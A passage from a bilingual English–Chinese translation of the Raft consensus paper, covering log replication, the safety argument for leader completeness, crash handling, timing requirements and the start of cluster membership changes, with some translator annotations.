order).</p><p>领导者决定对状态机应用日志条目的安全时机，这样的条目称为提交（committed）。Raft保证提交后的条目是持久的，并且最终将被所有可用的状态机执行。当一个日志条目被集群中的大多数服务器成功复制后，它就会被领导者提交（例如图6中的条目7），这一个过程同时也会将此条目之前的所有日志条目一并提交，包括之前任期的领导者所创建的条目。第5.4节讨论了领导者发生变动后应用这个规则的微妙之处，同时也说明了这个承诺的定义是安全的。领导者会一直跟踪最新提交的日志条目索引，并将它包含在随后的Append Entries RPCs（包括心跳）中，以便其他服务器识别，并应用到自身状态机。</p><p>We designed the Raft log mechanism to maintain a high level of coherency between the logs on different servers. Not only does this simplify the system’s behavior and make it more predictable, but it is an important component of ensuring safety. Raft maintains the following properties, which together constitute the Log Matching Property in Figure 3:</p><p>我们设计了Raft的日志机制来保证不同服务器上日志之间的高度一致性。这不仅简化了系统的行为，提高了可预测性，并且也是确保安全的重要组成部分。Raft维护了以下特性，这些特性共同构成图3中的日志匹配特性：</p><ul><li>If two entries in different logs have the same index and term, then they store the same command.</li><li>If two entries in different logs have the same index and term, then the logs are identical in all preceding entries.</li></ul><br /><ul><li><strong>如果不同日志中的两个条目具有相同的索引和任期号，则它们存储着相同的命令。</strong></li><li><strong>如果不同日志中的两个条目具有相同的索引和任期号，则之前所有的条目中的日志都是相同的。</strong></li></ul><p>The first property follows from the fact that a leader creates at most one entry with a given log index in a given term, and log entries never change their position in the log. The second property is guaranteed by a simple consistency check performed by AppendEntries. When sending an AppendEntries RPC, the leader includes the index and term of the entry in its log that immediately precedes the new entries. If the follower does not find an entry in its log with the same index and term, then it refuses the new entries. The consistency check acts as an induction step: the initial empty state of the logs satisfies the Log Matching Property, and the consistency check preserves the Log Matching Property whenever logs are extended. As a result, whenever AppendEntries returns successfully, the leader knows that the follower’s log is identical to its own log up through the new entries.</p><p>第一个特性表明，领导者在一个日志索引位置至多只会创建一个日志条目，并且日志中的条目位置都是固定的。第二个特性由AppendEntries执行的简单一致性检查来保证。在发送Append Entries RPCs时，领导者会将要发送的最新条目之前的条目索引（preLogIndex）及任期号（preLogTerm）包含进去，<strong>如果跟随者在其日志中找不到匹配的前置条目索引和前置任期号，则拒绝该日志条目</strong>。一致性检查执行符合递归特性：初始的空日志满足日志匹配属性（Log Matching Property），随着每一次日志扩充，一致性检查都确保符合Log Matching Property。因此，每当AppendEntries成功返回时，领导者就知道跟随者的日志在新通过的日志及之前的日志和自己的保持一致。</p><p>During normal operation, the logs of the leader and followers stay consistent, so the AppendEntries consistency check never fails. However, leader crashes can leave the logs inconsistent (the old leader may not have fully replicated all of the entries in its log). These inconsistencies can compound over a series of leader and follower crashes. Figure 7 illustrates the ways in which followers’ logs may differ from that of a new leader. A follower may be missing entries that are present on the leader, it may have extra entries that are not present on the leader, or both. Missing and extraneous entries in a log may span multiple terms.</p><p>正常情况下，领导者和跟随者的日志能够保持一致，因此一致性检查不会失败。但是，当领导者宕机后，就会出现日志不一致的情况（旧的领导者可能还会有一部分日志没来得及成功的复制给跟随者）。日志的不一致会随着一系列的领导者和跟随者的宕机而变得更加严重。图7 中展示了跟随者和新的领导者日志的不同之处。跟随者可能会缺少一些领导者中存在的日志条目，也有可能拥有一些领导者中不存在的日志条目，或者这两种情况都存在。日志中丢失的和无关的条目可能跨越多个任期。</p><div><p><img src="/assets/images/raft-logs-diff.png" alt="Diff Logs" loading="lazy"></p></div><p>Figure 7: When the leader at the top comes to power, it is possible that any of scenarios (a–f) could occur in follower logs. Each box represents one log entry; the number in the box is its term. A follower may be missing entries (a–b), may have extra uncommitted entries (c–d), or both (e–f). For example, scenario (f) could occur if that server was the leader for term 2, added several entries to its log, then crashed before committing any of them; it restarted quickly, became leader for term 3, and added a few more entries to its log; before any of the entries in either term 2 or term 3 were committed, the server crashed again and remained down for several terms.</p><p>图7：第一行的是领导者，跟随者可能有（a-f）几种场景。每个框代表一个日志条目；方框中的数字是它的任期。跟随者可能缺少条目（a–b），可能有额外的未提交条目（c–d），或者两者都有（e–f）。例如，场景（f）发生时，该服务器可能是任期2的领导者，在其日志中添加了几个条目后，然后在提交日志条目之前崩溃；它很快重新启动，然后成为了任期3的领导者，并在日志中添加了一些日志条目，在提交第2项或第3项中的日志条目之前再次宕机，并在接下来的几个任期内始终处于宕机状态。</p><p>In Raft, the leader handles inconsistencies by forcing the followers’ logs to duplicate its own. This means that conflicting entries in follower logs will be overwritten with entries from the leader’s log. Section 5.4 will show that this is safe when coupled with one more restriction.</p><p>在Raft中，领导者通过强制跟随者复制自己的日志来处理日志的不一致问题。这意味着，跟随者中不一致的日志条目会被领导者中的日志条目所覆盖。</p><p>To bring a follower’s log into consistency with its own, the leader must find the latest log entry where the two logs agree, delete any entries in the follower’s log after that point, and send the follower all of the leader’s entries after that point. All of these actions happen in response to the consistency check performed by AppendEntries RPCs. The leader maintains a nextIndex for each follower, which is the index of the next log entry the leader will send to that follower. When a leader first comes to power, it initializes all nextIndex values to the index just after the last one in its log (11 in Figure 7). If a follower’s log is inconsistent with the leader’s, the AppendEntries consistency check will fail in the next AppendEntries RPC. After a rejection, the leader decrements nextIndex and retries the AppendEntries RPC. Eventually nextIndex will reach a point where the leader and follower logs match. When this happens, AppendEntries will succeed, which removes any conflicting entries in the follower’s log and appends entries from the leader’s log (if any). Once AppendEntries succeeds, the follower’s log is consistent with the leader’s, and it will remain that way for the rest of the term.</p><p>为了使跟随者的日志与自己的日志保持一致，领导者必须找到两个日志一致的最新日志条目，删除该点之后跟随者日志中的所有条目，并在该点之后将领导者的所有条目发送给跟随者。所有这些操作都是由AppendEntries RPCs的一致性检查引发执行的。<strong>领导者为每个跟随者都维护了一个nextIndex变量，它是领导者将要发送给改跟随者的下一个日志条目的索引。当一个领导者第一次掌权时，它会将所有跟随者的nextIndex初始化为最后一个日志条目的下一个索引（图7中的11）。如果跟随者与领导者的日志不一致，AppendEntries的一致性检查就会在下一次的Append Entries RPCs中返回失败。一次失败后，领导者就会将该跟随着的nextIndex减1，然后重新发送Append Entries RPCs，如此循环往复，直到找到一个领导者和跟随者的日志能通过AppendEntries的一致性检查的nextIndex值。此时，AppendEntries将成功执行，这将删除跟随者日志中任何冲突的条目，并复制领导者此索引之后的所有日志同步给跟随者。</strong> 一旦AppendEntries成功，追随者的日志与领导者的日志是一致的，并且在余下的任期内都将保持这种状态。</p><p>If desired, the protocol can be optimized to reduce the number of rejected AppendEntries RPCs. For example, when rejecting an AppendEntries request, the follower can include the term of the conflicting entry and the first index it stores for that term. With this information, the leader can decrement nextIndex to bypass all of the conflicting entries in that term; one AppendEntries RPC will be required for each term with conflicting entries, rather than one RPC per entry. In practice, we doubt this optimization is necessary, since failures happen infrequently and it is unlikely that there will be many inconsistent entries.</p><p>如果需要的话，可以对协议进行优化，以减少被拒绝的RPC的数量。例如，当拒绝AppendEntries RPCs时，跟随者可以将包括冲突条目的任期和此任期内存储的第一个条目返回给领导者。这样，领导者就可以将nextIndex直接减去所有冲突的条目最早的那个条目。一个任期内的日志条目冲突只需要一次AppendEntries RPCs就可以，而不需要像之前那样每个条目一次AppendEntries RPCs。但是在实际应用中，我们认为此优化是完全没有必要的，因为AppendEntries RPCs请求失败并不是经常发生，并且好像也不会有很多冲突的日志条目。</p><p>With this mechanism, a leader does not need to take any special actions to restore log consistency when it comes to power. It just begins normal operation, and the logs automatically converge in response to failures of the AppendEntries consistency check. A leader never overwrites or deletes entries in its own log (the Leader Append-Only Property in Figure 3).</p><p>通过这种机制，当一个领导者掌权时，不需要采取任何额外的措施来恢复日志一致性。它只需要执行正常的操作，日志就会随着AppendEntries的一致性检查自动收敛。<strong>领导者永远不会覆盖或删除自己日志中的条目（图3中的Leader Append Only属性）。</strong></p><p>This log replication mechanism exhibits the desirable consensus properties described in Section 2: Raft can accept, replicate, and apply new log entries as long as a majority of the servers are up; in the normal case a new entry can be replicated with a single round of RPCs to a majority of the cluster; and a single slow follower will not impact performance.</p><p>这中日志复制机制展示了我们在第2节中描述的共识属性：Raft只要在大多数服务器正常运行的情况下就能执行日志条目的接收，复制和应用。正常情况下一次RPCs就能完成一个日志条目的复制，单个跟随者的操作延迟不影响整体性能。</p><h3 id="5-4、安全性"><a href="#5-4、安全性" class="headerlink" title="5.4、安全性"></a>5.4、安全性</h3><p>The previous sections described how Raft elects leaders and replicates log entries. However, the mechanisms described so far are not quite sufficient to ensure that each state machine executes exactly the same commands in the same order. For example, a follower might be unavailable while the leader commits several log entries, then it could be elected leader and overwrite these entries with new ones; as a result, different state machines might execute different command sequences.</p><p>之前的章节描述了Raft如何进行领导选举和日志复制的。但是，到目前为止所描述的机制并不能很有效的保证每一个状态机以同样的顺序执行执行同样的命令。例如，在一个跟随者不可用的时候，领导者提交了一些日志条目，然后该跟随者恢复正常后被选举成了领导者，然后使用新的日志条目覆盖掉了之前的领导者提交了但没有被成功复制的那些条目。这样的话，不同服务器的状态机可能就执行了不同的命令序列。</p><p>This section completes the Raft algorithm by adding a restriction on which servers may be elected leader. The restriction ensures that the leader for any given term contains all of the entries committed in previous terms (the Leader Completeness Property from Figure 3). Given the election restriction, we then make the rules for commitment more precise. Finally, we present a proof sketch for the Leader Completeness Property and show how it leads to correct behavior of the replicated state machine.</p><p>这一章节对于可能会被选为领导者的服务器添加了一些限制。使得特定任期内的领导者能够包含之前任期内提交的日志条目（图3中的Leader Completion属性）。通过增加了这些选举限制，我们进一步细化了提交规则。最后，我们呈现了一个领导者完备性（Leader Completeness Property）的证明草图，并展示了它是如何指导状态机正确执行的。</p><h4 id="5-4-1、选举限制"><a href="#5-4-1、选举限制" class="headerlink" title="5.4.1、选举限制"></a>5.4.1、选举限制</h4><p>In any leader-based consensus algorithm, the leader must eventually store all of the committed log entries. In some consensus algorithms, such as Viewstamped Replication [22], a leader can be elected even if it doesn’t initially contain all of the committed entries. These algorithms contain additional mechanisms to identify the missing entries and transmit them to the new leader, either during the election process or shortly afterwards. Unfortunately, this results in considerable additional mechanism and complexity. Raft uses a simpler approach where it guarantees that all the committed entries from previous terms are present on each new leader from the moment of its election, without the need to transfer those entries to the leader. This means that log entries only flow in one direction, from leaders to followers, and leaders never overwrite existing entries in their logs.</p><p>在任何基于领导者的共识算法（leader-based consensus algorithm）中，领导者最终都必须保存着所有提交的日志条目。在一些共识算法中，比如 Viewstamped Replication[22]，即使一开始没有包含所有提交的条目，也可以选出一个领导者。这些算法包含额外的机制来识别丢失的条目，并在选举过程中或之后不久将其传送给新的领导人。不幸的是，这带来了相当多的额外机制和复杂性。Raft使用一种简单的方法使得之前领导者提交的日志条目能够在一选举出新的领导者时就能完整的程现在领导者上，而不需要任何的传送。这就意味着，<strong>日志条目只会从领导者流向跟随者，领导者永远不会覆盖其日志中的现有条目</strong>。</p><div><p><img src="/assets/images/raft-time-sequence.png" alt="Time Sequence" loading="lazy"></p></div><p>Figure 8: A time sequence showing why a leader cannot determine commitment using log entries from older terms. In (a) S1 is leader and partially replicates the log entry at index 2. In (b) S1 crashes; S5 is elected leader for term 3 with votes from S3, S4, and itself, and accepts a different entry at log index 2. In © S5 crashes; S1 restarts, is elected leader, and continues replication. At this point, the log entry from term 2 has been replicated on a majority of the servers, but it is not committed. If S1 crashes as in (d), S5 could be elected leader (with votes from S2, S3, and S4) and overwrite the entry with its own entry from term 3. However, if S1 replicates an entry from its current term on a majority of the servers before crashing, as in (e), then this entry is committed (S5 cannot win an election). At this point all preceding entries in the log are committed as well.</p><p>图 8：该时间序列显示了为什么领导者不能使用历史任期的日志条目来确定承诺（determine commitment）。 (a) S1 是领导者，部分复制了索引 2 处的日志条目。 (b) S1 崩溃，S5 被选为第 3 任期的领导者（来自S3、S4 和它自己的投票），并在日志索引 2 处接受不同的条目。 © S5 宕机， S1 重新启动，被选为领导者，并继续复制。 此时第 2 项的日志条目已在大多数服务器上复制，但尚未提交。 （d）S1再次宕机，则S5可以被选为领导（来自S2，S3和S4的投票）并从第 3 任期中覆盖其自身条目的条目。但是，如果S1在崩溃之前在大多数服务器上复制了其当前任期的条目，如（e）中所示，之后该条目被提交（则S5无法赢得选举）。此时，日志中所有前面的条目也将提交。</p><p>Raft uses the voting process to prevent a candidate from winning an election unless its log contains all committed entries. A candidate must contact a majority of the cluster in order to be elected, which means that every committed entry must be present in at least one of those servers. If the candidate’s log is at least as up-to-date as any other log in that majority (where “up-to-date” is defined precisely below), then it will hold all the committed entries. The RequestVote RPC implements this restriction: the RPC includes information about the candidate’s log, and the voter denies its vote if its own log is more up-to-date than that of the candidate.</p><p>Raft使用投票过程来阻止候选者赢得选举，除非它的日志包含所有提交的条目。候选者必须联系集群的大多数成员才能当选，这意味着每个提交的条目必须至少出现在其中一个服务器中。如果候选者的日志至少和大多数人的日志一样都是最新的（下面精确地定义了“最新”），那么它将保存所有提交的条目。RequestVote RPC实现了这个限制：RPC中包含了关于候选者日志的信息，<strong>如果投票者自己的日志比候选者的日志更新得多，投票者就拒绝投票。</strong></p><p>Raft determines which of two logs is more up-to-date by comparing the index and term of the last entries in the logs. If the logs have last entries with different terms, then the log with the later term is more up-to-date. If the logs end with the same term, then whichever log is longer is more up-to-date.</p><p><strong>Raft通过比较两个服务器上日志的最后一个日志条目的任期和索引来决定谁的日志时最新的。任期不同，则任期大的日志新。任期相同，则索引大的日志新。</strong></p><h4 id="5-4-2、提交前置任期的条目"><a href="#5-4-2、提交前置任期的条目" class="headerlink" title="5.4.2、提交前置任期的条目"></a>5.4.2、提交前置任期的条目</h4><p>As described in Section 5.3, a leader knows that an entry from its current term is committed once that entry is stored on a majority of the servers. If a leader crashes before committing an entry, future leaders will attempt to finish replicating the entry. However, a leader cannot immediately conclude that an entry from a previous term is committed once it is stored on a majority of servers. Figure 8 illustrates a situation where an old log entry is stored on a majority of servers, yet can still be overwritten by a future leader.</p><p>如第 5.3 节所述，一旦该条目存储在大多数服务器上，领导者就知道其当前任期中的条目已提交。 如果领导者在提交条目之前崩溃，未来的领导者将尝试完成复制该条目。 然而，领导者不能立即断定前一任期的条目是否已经存储在大多数服务器上并完成了提交。 图 8 中说明了一种场景，存在大多数服务器上的日志条目被新的领导者的日志给覆盖了。</p><div><p><img src="/assets/images/raft-overlay-log.png" alt="Overlay Log" loading="lazy"></p></div><p>Figure 9: If S1 (leader for term T) commits a new log entry from its term, and S5 is elected leader for a later term U, then there must be at least one server (S3) that accepted the log entry and also voted for S5.</p><p>图 9：如果 S1（任期 T 的领导者）在其任期中提交了一个新的日志条目，并且 S5 被选为以后任期 U 的领导者，那么必须至少有一个服务器（S3）接受该日志条目并投票给 S5。</p><p>To eliminate problems like the one in Figure 8, Raft never commits log entries from previous terms by counting replicas. Only log entries from the leader’s current term are committed by counting replicas; once an entry from the current term has been committed in this way, then all prior entries are committed indirectly because of the Log Matching Property. There are some situations where a leader could safely conclude that an older log entry is committed (for example, if that entry is stored on every server), but Raft takes a more conservative approach for simplicity.</p><p>为了消除图 8 中的这种问题，<strong>Raft 从来不会通过计算副本数来决定是否提交上一个任期的日志条目</strong>。 只有领导者当期的日志条目需要通过计算备份数来决定提交。一旦当前任期内的一个日志条目以这种方式被提交了，那么根据 Log Matching Property 的限制，所有之前的所有日志条目也就间接的被提交了。在某些情况下，领导者能够立即识别一个旧的日志条目是否被提交了（例如，如果该条目存储在每个服务器上），但是Raft为了简洁，选择了使用更加保守的方法。</p><p>Raft incurs this extra complexity in the commitment rules because log entries retain their original term numbers when a leader replicates entries from previous terms. In other consensus algorithms, if a new leader rereplicates entries from prior “terms,” it must do so with its new “term number.” Raft’s approach makes it easier to reason about log entries, since they maintain the same term number over time and across logs. In addition, new leaders in Raft send fewer log entries from previous terms than in other algorithms (other algorithms must send redundant log entries to renumber them before they can be committed).</p><p>Raft 在提交规则中会产生这种额外的复杂性，因为<strong>当领导者从以前的任期复制条目时，日志条目会保留其原始任期号。 在其他共识算法中，如果一个新的领导者从之前的“任期”中重新复制条目，它必须使用新的“任期号”这样做</strong>。 Raft 的方法使推理日志条目变得更容易，因为它们随着时间的推移和跨日志保持相同的术语编号。 此外，与其他算法相比，Raft 中的新领导者发送的之前任期中的日志条目更少（其他算法必须发送冗余日志条目来重新编号，然后才能提交）。</p><h4 id="5-4-3、安全性论证"><a href="#5-4-3、安全性论证" class="headerlink" title="5.4.3、安全性论证"></a>5.4.3、安全性论证</h4><p>Given the complete Raft algorithm, we can now argue more precisely that the Leader Completeness Property holds (this argument is based on the safety proof; see Section 9.2). We assume that the Leader Completeness Property does not hold, then we prove a contradiction. Suppose the leader for term T (leaderT) commits a log entry from its term, but that log entry is not stored by the leader of some future term. Consider the smallest term U &gt; T whose leader (leaderU) does not store the entry.</p><p>给出了完整的 Raft 算法，我们现在可以进一步的对领导者完备性（Leader Completeness Property）进行论证。（这个论证基于安全性证明，参见第 9.2 节）。 首先我们假设Leader Completeness Property 不成立，那么我们需要提出一个矛盾点。 假设任期为T的领导者T (Leader T) 提交了其任期内的日志条目，但是这个日志条目并没有被之后任期的领导者存储。 假设存在没有存储这条日志条目的领导者U（Leader U），其中任期U大于任期T。</p><ol><li>The committed entry must have been absent from leaderU’s log at the time of its election (leaders never delete or overwrite entries).</li><li>leaderT replicated the entry on a majority of the cluster, and leaderU received votes from a majority of the cluster. Thus, at least one server (“the voter”) both accepted the entry from leaderT and voted for leaderU, as shown in Figure 9. The voter is key to reaching a contradiction.</li><li>The voter must have accepted the committed entry from leaderT before voting for leaderU; otherwise it would have rejected the AppendEntries request from leaderT (its current term would have been higher than T).</li><li>The voter still stored the entry when it voted for leaderU, since every intervening leader contained the entry (by assumption), leaders never remove entries, and followers only remove entries if they conflict with the leader.</li><li>The voter granted its vote to leaderU, so leaderU’s log must have been as up-to-date as the voter’s. This leads to one of two contradictions.</li><li>First, if the voter and leaderU shared the same last log term, then leaderU’s log must have been at least as long as the voter’s, so its log contained every entry in the voter’s log. This is a contradiction, since the voter contained the committed entry and leaderU was assumed not to.</li><li>Otherwise, leaderU’s last log term must have been larger than the voter’s. Moreover, it was larger than T, since the voter’s last log term was at least T (it contains the committed entry from term T). The earlier leader that created leaderU’s last log entry must have contained the committed entry in its log (by assumption). Then, by the Log Matching Property, leaderU’s log must also contain the committed entry, which is a contradiction.</li><li>This completes the contradiction. Thus, the leaders of all terms greater than T must contain all entries from term T that are committed in term T.</li><li>The Log Matching Property guarantees that future leaders will also contain entries that are committed indirectly, such as index 2 in Figure 8(d).</li></ol><br /><ol><li>在Leader U当选时，它的日志里面肯定没有这个已经被提交的日志条目。（领导者永远不会删除或覆盖条目）。</li><li>LeaderT 已经将该日志条目复制给了集群中的大多数成员，LeaderU在选举时收到了集群大多数成员的投票。 因此，至少有一个服务器（”“投票者”）同时接受了来自 LeaderT 的日志条目并投票给了 LeaderU，如图 9 所示。投票者是达成矛盾的关键。</li><li>投票者在给LeaderU之前必然已经接受了LeaderT提交的日志条目，否则它将拒绝来自 LeaderT 的 AppendEntries 请求（拒绝的时候，其当前任期将高于 T）。</li><li>投票者在投票给 LeaderU 时还存储该条目，因为每个参与其中的领导者都包含该条目（假设），领导者从不删除条目，而跟随者仅在与领导者冲突时才会删除条目。</li><li>投票者把选票给了LeaderU，因此LeaderU的日志必须和投票者的日志一样都是最新的。 这导致了两个矛盾中的一个。</li><li>首先，如果投票者和LeaderU 的最后一个日志任期相同，那么LeaderU 的日志必须至少和投票者一样长，所以它的日志包含了投票者日志中的每一个条目。 这是一个矛盾，因为投票者包含了被提交的条目，而LeaderU 则没有。</li><li>否则，LeaderU 的最后一个日志任期必须大于投票者的。 进一步说，它大于 T，因为投票者的最后一个日志期限至少是 T（它包含来自期限 T 的提交条目）。假设，创建 LeaderU 的最后一个日志条目的较早的领导者的日志中必须包含已经提交的日志条目，那么，根据日志匹配属性，LeaderU 的日志也必须包含提交的条目，这是一个矛盾。</li><li>这就完成了矛盾。 因此，所有任期大于 T 的领导者必须包含任期 T 中已经提交的所有日志条目。</li><li>Log Matching Property保证未来的领导者也将包含间接提交的条目，例如图 8(d) 中的索引 2。</li></ol><p>Given the Leader Completeness Property, we can prove the State Machine Safety Property from Figure 3, which states that if a server has applied a log entry at a given index to its state machine, no other server will ever apply a different log entry for the same index. At the time a server applies a log entry to its state machine, its log must be identical to the leader’s log up through that entry and the entry must be committed. Now consider the lowest term in which any server applies a given log index; the Log Completeness Property guarantees that the leaders for all higher terms will store that same log entry, so servers that apply the index in later terms will apply the same value. Thus, the State Machine Safety Property holds.</p><p>依据领导者完整性属性（Leader Completeness Property），我们可以证明图 3 中的状态机安全属性（State Machine Safety Property），它指出如果服务器已将给定索引处的日志条目应用于其状态机，则没有其他服务器会为同一索引应用不同的日志条目。当服务器已经将日志条目应用于其状态机时，其日志必须与通过该条目成为领导者的日志相同，并且该日志条目必须已经被提交了。现在考虑任何服务器应用给定日志索引的最低期限； 日志完整性属性（Log Completeness Property）保证所有更高任期的领导者将存储相同的日志条目，因此在以后的任期中应用索引的服务器将应用相同的值。 因此，状态机安全属性（State Machine Safety Property）成立。</p><p>Finally, Raft requires servers to apply entries in log index order. Combined with the State Machine Safety Property, this means that all servers will apply exactly the same set of log entries to their state machines, in the same order.</p><p>最后，Raft 要求服务器按日志索引顺序应用条目。 结合状态机安全属性（State Machine Safety Property），这意味着所有服务器都将以相同的顺序将完全相同的日志条目集应用于其状态机。</p><h3 id="5-5、跟随者和候选者宕机"><a href="#5-5、跟随者和候选者宕机" class="headerlink" title="5.5、跟随者和候选者宕机"></a>5.5、跟随者和候选者宕机</h3><p>Until this point we have focused on leader failures. Follower and candidate crashes are much simpler to handle than leader crashes, and they are both handled in the same way. If a follower or candidate crashes, then future RequestVote and AppendEntries RPCs sent to it will fail. Raft handles these failures by retrying indefinitely; if the crashed server restarts, then the RPC will complete successfully. If a server crashes after completing an RPC but before responding, then it will receive the same RPC again after it restarts. Raft RPCs are idempotent, so this causes no harm. For example, if a follower receives an AppendEntries request that includes log entries already present in its log, it ignores those entries in the new request.</p><p>到目前为止，我们的关注点都在领导者的失败上。 跟随者和候选者的失败相对来说，更容易进行处理，处理机制也与领导者相同。如果追随者或候选者发生了宕机，那么之后发送给它们的 RequestVote RPCs 和 AppendEntries RPCs 将失败。 Raft 通过无限重试来处理这些失败； 如果宕机的服务器重新启动，则 RPC 将成功完成请求。 当服务器接收处理完RPC请求，但是在回复之前宕机，那么它会在重新启动后再次收到相同的 RPC。 Raft RPC 是幂等的，所以这种情况并不会引发任何问题。 例如，如果一个跟随者收到一个 AppendEntries 请求，其中包括其日志中已经存在的日志条目，它会忽视这此请求。</p><h3 id="5-6、时间和可用性"><a href="#5-6、时间和可用性" class="headerlink" title="5.6、时间和可用性"></a>5.6、时间和可用性</h3><p>One of our requirements for Raft is that safety must not depend on timing: the system must not produce incorrect results just because some event happens more quickly or slowly than expected. However, availability (the ability of the system to respond to clients in a timely manner) must inevitably depend on timing. For example, if message exchanges take longer than the typical time between server crashes, candidates will not stay up long enough to win an election; without a steady leader, Raft cannot make progress.</p><p>我们对Raft的一个要求是，安全性不能依赖于时间：系统不能仅仅因为某些事件发生得比预期的快或慢而产生错误的结果。然而，可用性（系统及时响应客户机的能力）必然取决于时间。例如，由于服务器崩溃而导致信息交换的时间比通常情况下更长，候选者就无法长时间等待来赢得选举。如果没有一个稳定的领导者，Raft就不能正常的执行。</p><p>Leader election is the aspect of Raft where timing is most critical. Raft will be able to elect and maintain a steady leader as long as the system satisfies the following timing requirement:</p><p>领导者选举是 Raft 中时机最关键的方面。 只要系统满足以下时序要求，Raft 将能够选举和维护一个稳定的领导者：</p><ul><li>broadcastTime ≪ electionTimeout ≪ MTBF</li></ul><br /><ul><li>广播时间 &lt;&lt; 选举超时时间 &lt;&lt; 平均故障间隔（MTBF，Mean Time Between Failures）</li></ul><p>In this inequality broadcastTime is the average time it takes a server to send RPCs in parallel to every server in the cluster and receive their responses; electionTimeout is the election timeout described in Section 5.2; and MTBF is the average time between failures for a single server. The broadcast time should be an order of magnitude less than the election timeout so that leaders can reliably send the heartbeat messages required to keep followers from starting elections; given the randomized approach used for election timeouts, this inequality also makes split votes unlikely. The election timeout should be a few orders of magnitude less than MTBF so that the system makes steady progress. When the leader crashes, the system will be unavailable for roughly the election timeout; we would like this to represent only a small fraction of overall time.</p><p>在这个不等式中，广播时间（broadcastTime）是服务器向集群中的每个服务器并行发送 RPC 并接收它们的响应所花费的平均时间； 选举超时时间（electionTimeout）是第 5.2 节中描述的选举超时时间； 平均故障时间（MTBF，Mean Time Between Failures）是单个服务器的平均故障间隔时间。 广播时间应该比选举超时时间少一个数量级，这样领导者可以及时的发送心跳信息给跟随者以组织新的领导选举。通过使用随机的选举超时时间，分裂投票的情况也不大可能会出现。选举超时时间应该比 平均故障时间（MTBF） 小几个数量级，这样系统就能正常运行。 当领导者宕机时，系统将在选举超时时间（electionTimeout） 内不可用； 我们希望这仅占总时间的一小部分。</p><p>The broadcast time and MTBF are properties of the underlying system, while the election timeout is something we must choose. Raft’s RPCs typically require the recipient to persist information to stable storage, so the broadcast time may range from 0.5ms to 20ms, depending on storage technology. As a result, the election timeout is likely to be somewhere between 10ms and 500ms. Typical server MTBFs are several months or more, which easily satisfies the timing requirement.</p><p>广播时间（Broadcast Time）和 平均故障时间（MTBF，Mean Time Between Failures）是底层系统的属性，而选举超时时间是需要我们自己进行设置的。 Raft 的 RPCs 通常需要接收方将信息持久化到稳定的存储中，因此广播时间可能在 0.5 毫秒到 20 毫秒之间，具体取决于存储技术。 因此，选举超时很可能在 10 毫秒到 500 毫秒之间。 典型的服务器 MTBF 为几个月或更长时间，完全满足系统的时间因素要求。</p><h2 id="6、集群成员变更"><a href="#6、集群成员变更" class="headerlink" title="6、集群成员变更"></a>6、集群成员变更</h2><p>Up until now we have assumed that the cluster configuration (the set of servers participating in the consensus algorithm) is fixed. In practice, it will occasionally be necessary to change the configuration, for example to replace servers when they fail or to change the degree of replication. Although this can be done by taking the entire cluster off-line, updating configuration files, and then restarting the cluster, this would leave the cluster unavailable during the changeover. In addition, if there are any manual steps, they risk operator error. In order to avoid these issues, we decided to automate configuration changes and incorporate them into the Raft consensus algorithm.</p><p>到目前为止，我们假设集群配置（参与共识算法的服务器集）是固定的。 在实践中，有时需要更改配置，例如在服务器出现故障时更换服务器或更改复制的程度。 虽然这可以通过使整个集群下线、更改配置，然后重新启动集群来完成，但这会使集群在切换期间不可用。 另外，人为操作的因素也更容易引发系统错误。 为了避免这些问题，我们决定实现配置变更的自动化，并将其融合进共识算法中。</p><p>For the configuration change mechanism to be safe, there must be no point during the transition where it is possible for two leaders to be elected for the same term. Unfortunately, any approach where servers switch directly from the old configuration to the new configuration is unsafe. It isn’t possible to atomically switch all of the servers at once, so the cluster can potentially split into two independent majorities during the transition (see Figure 10).</p><p>为了保障配置变更机制的安全，在配置变更期间，不能存在同一任期内选举出两个领导者的情况。 不幸的是，任何服务器直接从旧配置切换到新配置的方法都是不安全的。 一次原子地切换所有服务器是不可能的，因此在转换过程中，集群极有可能出现裂脑现象（参见图 10）。</p><div><p><img src="/assets/images/raft-mem-change.png" alt="Cluster Membership Changes" loading="lazy"></p></div><p>Figure 10: Switching directly from one configuration to another is unsafe because different servers will switch at different times. In this example, the cluster grows from three servers to five. Unfortunately, there is a point in time where two different leaders can be elected for the same term, one with a majority of the old configuration (Cold) and another with a majority of the new configuration (Cnew).</p><p>图 10：由于不同的服务器的切换时间不一样，因此直接从一种配置切换到另一种配置是不安全的。 在本例中，集群从三台服务器增加到五台。 不幸的是，有一个时间点上会出现同一个任期内可以选举出两个领导者的情况，一个领导者被拥有旧配置（Cold）的成员选举出，另一个则被拥有新配置（Cnew）的成员选举出。（在图例中出现问题的时刻，Server1可以通过自身以及Server2的投票拿到<strong>2&#x2F;3比例的选票？？</strong> 而赢得选举，成为领导者；并且此时Server5可以通过自身和Server3以及Server4的投票 <strong>拿到3&#x2F;5比例的选票？？</strong> 赢得选举，最终存在两个领导者。）</p><p>In order to ensure safety, configuration changes must use a two-phase approach. There are a variety of ways to implement the two phases. For example, some systems (e.g., [22]) use the first phase to disable the old configuration so it cannot process client requests; then the second phase enables the new configuration. In Raft the cluster first switches to a transitional configuration we call joint consensus; once the joint consensus has been committed, the system then transitions to the new configuration. The joint consensus combines both the old and new configurations:</p><p>为了确保安全，配置更改必须使用两阶段法。 有多种方法可以实现这两个阶段。 例如，某些系统（例如 [22]） 在第一阶段禁用旧配置，使其无法处理客户端请求； 然后在第二阶段启用新配置。 在 Raft 中，集群的配置会首先进入到我们称之为联合共识（joint consensus）的过渡配置； 一旦达成了联合共识，系统就会转换到新的配置。 联合共识中结合了新旧配置：</p><ul><li>Log entries are replicated to all servers in both configurations.</li><li>Any server from either configuration may serve as leader</li><li>Agreement (for elections and entry commitment) requires separate majorities from both the old and new configurations.</li></ul><br /><ul><li>日志条目会被复制到集群中两种配置下的所有服务器上。</li><li>任一配置中的任何服务器都可以作为领导者。</li><li>选举和日志条目提交的商定需要按照新旧配置中的大多数服务器原则来要求。</li></ul><div><p><img src="/assets/images/raft-timeline-for-conf-change.png" alt="Timeline For A Configuration Change" loading="lazy"></p></div><p>Figure 11: Timeline for a configuration change. Dashed lines show configuration entries that have been created but not committed, and solid lines show the latest committed configuration entry. The leader first creates the Cold,new configuration entry in its log and commits it to Cold,new (a majority of Cold and a majority of Cnew). Then it creates the Cnew entry and commits it to a majority of Cnew. There is no point in time in which Cold and Cnew can both make decisions independently.</p><p>图 11：配置更改的时间表。 虚线代表已创建但未提交的配置条目，实线代表最新提交的配置条目。 领导者首先在其日志中创建 Cold,new 配置条目并将其提交到 Cold,new（大多数 Cold 和大多数 Cnew）。 然后它创建 Cnew 条目并将其提交给大多数 Cnew。 Cold 和 Cnew 没有时间窗口可以独立做出决定。</p><p>The joint consensus allows individual servers to transition between configurations at different times without 